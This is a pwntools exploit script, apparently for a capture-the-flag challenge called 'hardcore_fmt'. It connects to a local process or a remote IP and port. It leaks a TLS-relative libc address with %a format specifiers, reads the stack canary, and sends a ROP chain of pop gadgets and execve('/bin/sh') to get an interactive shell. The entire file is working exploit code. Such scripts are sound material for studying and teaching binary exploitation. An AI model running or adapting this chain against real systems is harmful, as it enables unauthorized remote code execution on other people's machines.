#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./hardcore_fmt"
elf = context.binary

if sys.argv[1] == "l":
    io = process("./hardcore_fmt")
    libc = elf.libc
else:
    io = remote("39.106.110.69", 9999)
    libc = ELF("./libc-2.27.so", checksec = False)

libc.sym['one_gadget'] = 0x10a38c
libc.sym['prdi'] = 0x000000000002155f
libc.sym['prsi'] = 0x0000000000023e6a
libc.sym['prdx'] = 0x0000000000001b96

if __name__ == "__main__":
    #  gdb.attach(io, "bpie 0x918\nc")
    # context.log_level = "debug"
    #  raw_input("DEBUG: ")
    io.sendlineafter("hard-core fmt\n", "%A%A%A%a%a")
    io.recvuntil("20x0.0")
    leaked = int(io.recvuntil("p-", drop = True), 16) << 8
    success("leaked -> {:#x}".format(leaked))
    tls = leaked
    success("tls -> {:#x}".format(tls))
    canary_addr = tls + 0x28 + 1
    success("canary_addr -> {:#x}".format(canary_addr))
    libc.address = leaked - 0x612500 - 0x1000 * int(sys.argv[2])
    success("libc -> {:#x}".format(libc.address))
    io.recv()

    sleep(0.01)
    io.sendline(str(canary_addr))
    io.recvuntil(": ")
    canary = '\0' + io.recvn(7)
    print "canary :", canary[::-1].encode('hex')

    rop = fit({
            0x108: canary, 
            296: flat(libc.sym['prdi'], next(libc.search("/bin/sh")), 
                libc.sym['prsi'], 0, libc.sym['prdx'], 0, libc.sym['execve'])
        })

    sleep(0.01)
    io.sendline(rop)

    io.interactive()
